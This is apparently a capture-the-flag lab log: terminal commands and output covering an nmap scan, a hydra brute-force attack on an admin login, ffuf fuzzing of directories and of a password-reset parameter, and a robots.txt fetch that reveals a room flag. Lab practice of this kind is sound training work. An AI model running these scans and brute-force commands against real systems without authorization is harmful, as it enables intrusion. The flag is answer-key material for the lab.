


```
 nmap -n -Pn -vv -sV -T5 10.10.201.54
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-01 01:55 UTC
NSE: Loaded 45 scripts for scanning.
Initiating SYN Stealth Scan at 01:55
Scanning 10.10.201.54 [1000 ports]
Discovered open port 80/tcp on 10.10.201.54
Discovered open port 22/tcp on 10.10.201.54
Discovered open port 8080/tcp on 10.10.201.54
Increasing send delay for 10.10.201.54 from 0 to 5 due to 486 out of 1214 dropped probes since last increase.
Discovered open port 8000/tcp on 10.10.201.54
Warning: 10.10.201.54 giving up on port because retransmission cap hit (2).
Completed SYN Stealth Scan at 01:55, 5.91s elapsed (1000 total ports)
Initiating Service scan at 01:55
Scanning 4 services on 10.10.201.54
Completed Service scan at 01:56, 76.29s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.201.54.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:56
Completed NSE at 01:56, 6.08s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:56
Completed NSE at 01:56, 2.02s elapsed
Nmap scan report for 10.10.201.54
Host is up, received user-set (0.63s latency).
Scanned at 2024-04-01 01:55:21 UTC for 91s
Not shown: 980 closed ports
Reason: 980 resets
PORT      STATE    SERVICE         REASON         VERSION
22/tcp    open     ssh             syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http            syn-ack ttl 61 Apache httpd 2.4.41
306/tcp   filtered unknown         no-response
1092/tcp  filtered obrpd           no-response
1719/tcp  filtered h323gatestat    no-response
1840/tcp  filtered netopia-vo2     no-response
2191/tcp  filtered tvbus           no-response
2638/tcp  filtered sybase          no-response
3300/tcp  filtered ceph            no-response
3737/tcp  filtered xpanel          no-response
5730/tcp  filtered unieng          no-response
6389/tcp  filtered clariion-evr01  no-response
6792/tcp  filtered unknown         no-response
7000/tcp  filtered afs3-fileserver no-response
8000/tcp  open     http            syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
8080/tcp  open     http-proxy      syn-ack ttl 61 Werkzeug/2.2.3 Python/3.8.10
8100/tcp  filtered xprint-server   no-response
8180/tcp  filtered unknown         no-response
8192/tcp  filtered sophos          no-response
25734/tcp filtered unknown         no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=4/1%Time=660A1417%P=x86_64-pc-linux-gnu%r(Get
SF:Request,18ED,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.3\x20
SF:Python/3\.8\.10\r\nDate:\x20Mon,\x2001\x20Apr\x202024\x2001:55:34\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:06206\r\nConnection:\x20close\r\n\r\n<head>\n<style>\n\nbody\x20{\n\x20
SF:\x20background-color:#fff;\n\x20\x20\n\x20\x20background-position:cente
SF:r;\n\x20\x20background-repeat:repeat-y;\n\x20\x20font-family:\x20\"Luci
SF:da\x20Grande\",\"Lucida\x20Sans\x20Unicode\",geneva,verdana,sans-serif;
SF:\n\x20\x20font-size:10px;\n\x20\x20color:#777;\n}\n#container\x20{\n\x2
SF:0\x20width:500px;\n\x20\x20margin:0\x20auto;\n}\n\n#header\x20{\n\x20\x
SF:20background-color:#eeeeee;\n\x20\x20margin:10px;\n\x20\x20padding:30px
SF:\x2010px\x2030px\x2010px;\n\x20\x20border-top:2px\x20solid\x20#ccc;\n}\
SF:n\n#header\x20h1\x20{\n\x20\x20text-align:center;\n\x20\x20font-family:
SF:Trebuchet\x20MS,\x20Geneva,\x20Arial,\x20Helvetica,\x20sans-serif;\n\x2
SF:0\x20font-size:30px;\n\x20\x20color:#333;\n\x20\x20margin:0;\n\x20\x20f
SF:ont-weight:normal;\n}\n#header\x20h1\x20strong\x20{\n\x20\x20color:#A85
SF:BA6;\n}\n#header\x20h1\x20a\x20{\n\x20\x20color:#333;\n\x20\x20text-dec
SF:oration:none;\n}\n#header\x20h2\x20{\n\x20\x20font-size:11px;\n\x20\x20
SF:font-weight:normal;\n\x20\x20text-align:center;\n")%r(HTTPOptions,C7,"H
SF:TTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.3\x20Python/3\.8\.10
SF:\r\nDate:\x20Mon,\x2001\x20Apr\x202024\x2001:55:35\x20GMT\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTION
SF:S\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPReque
SF:st,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//
SF:EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/st
SF:rict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;char
SF:set=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response<
SF:/title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStat
SF:us\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x
SF:20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.83 seconds
           Raw packets sent: 1680 (73.920KB) | Rcvd: 1360 (54.420KB
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.201.54 -s 8080 http-post-form "/administrator:username=^USER^&password=^PASS^:Invalid username or password" -f -t 64
```

```
ffuf -u http://10.10.201.54:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 350 -e .php -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.201.54:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 350
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 6206, Words: 795, Lines: 310, Duration: 273ms]
forgot_password         [Status: 200, Size: 1516, Words: 647, Lines: 53, Duration: 216ms]
dashboard               [Status: 302, Size: 215, Words: 18, Lines: 6, Duration: 209ms]
administrator           [Status: 200, Size: 1609, Words: 669, Lines: 54, Duration: 193ms]
                        [Status: 200, Size: 6206, Words: 795, Lines: 310, Duration: 212ms]
password_reset          [Status: 200, Size: 26, Words: 2, Lines: 1, Duration: 355ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

```
ffuf -u http://10.10.201.54:8080/password_reset?FUZZ=xzx -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 26

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.201.54:8080/password_reset?FUZZ=xzx
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 26
________________________________________________

token                   [Status: 200, Size: 22, Words: 2, Lines: 1, Duration: 186ms]
:: Progress: [6453/6453] :: Job [1/1] :: 102 req/sec :: Duration: [0:01:07] :: Errors: 0 ::
```


```
curl 10.10.200.129:8000/robots.txt
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: THM{14b45bb9eefdb584b79063eca6a31b7a}
```

```
ffuf -u http://10.10.200.129:8000/FUZZ -w /usr/share/wordlists/dirb/common.txt -ic -t 100 -e .zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.200.129:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 197ms]
index.zip               [Status: 200, Size: 1922, Words: 6, Lines: 11, Duration: 369ms]
robots.txt              [Status: 200, Size: 115, Words: 7, Lines: 7, Duration: 231ms]
:: Progress: [9228/9228] :: Job [1/1] :: 461 req/sec :: Duration: [0:00:28] :: Errors: 0 ::

```

